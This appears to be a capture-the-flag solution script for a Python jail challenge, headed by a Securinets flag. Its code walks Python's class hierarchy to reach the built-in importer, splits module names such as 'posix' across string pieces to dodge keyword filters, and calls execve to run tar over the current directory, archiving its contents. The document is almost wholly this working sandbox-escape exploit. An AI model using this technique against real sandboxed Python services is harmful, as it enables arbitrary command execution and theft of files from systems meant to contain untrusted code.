# Securinets{713cb5955a3b791faa5228c7fda27b2a3b080c8ccb8cb720eaa1ede1a2b3b1d0}
def f():
    print(sys.builtin_module_names)
    for cls in ''.__class__.__base__.__subclasses__():
        if str(cls) == "<class '_frozen_impor" + "tlib.BuiltinImporter'>":
            s = cls.find_spec("po" + "six")
            print(s)
            m = cls.create_module(s)
            print(m)
            #m.execve("/bin/ls", ["/bin/ls"], {})
            m.execve("/bin/tar", ["/bin/tar", "-c", "."], {})
            break
    else:
        raise RuntimeError("No BuiltinImporter")


